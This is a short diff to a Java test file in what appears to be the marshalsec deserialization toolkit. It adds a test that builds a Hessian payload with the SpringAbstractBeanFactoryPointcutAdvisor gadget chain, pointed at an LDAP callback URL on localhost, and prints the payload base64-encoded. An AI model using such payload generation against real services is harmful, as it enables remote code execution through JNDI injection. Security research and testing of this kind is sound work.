@@ -42,6 +42,7 @@ import marshalsec.Red5AMF3;
 import marshalsec.SnakeYAML;
 import marshalsec.XStream;
 import marshalsec.YAMLBeans;
+import sun.misc.BASE64Encoder;
 
 
 /**
@@ -155,6 +156,12 @@ public class GadgetsTest {
     @Test
     public void yamlbeans () throws Exception {
         runTests(new YAMLBeans());
+    }
+
+    @Test
+    public void apiRun() throws Exception {
+        byte[] x = new Hessian().apiRun("SpringAbstractBeanFactoryPointcutAdvisor",new String[]{"ldap://127.0.0.1:8080/obj"});
+        System.out.println(new BASE64Encoder().encode(x));
     }
 
 
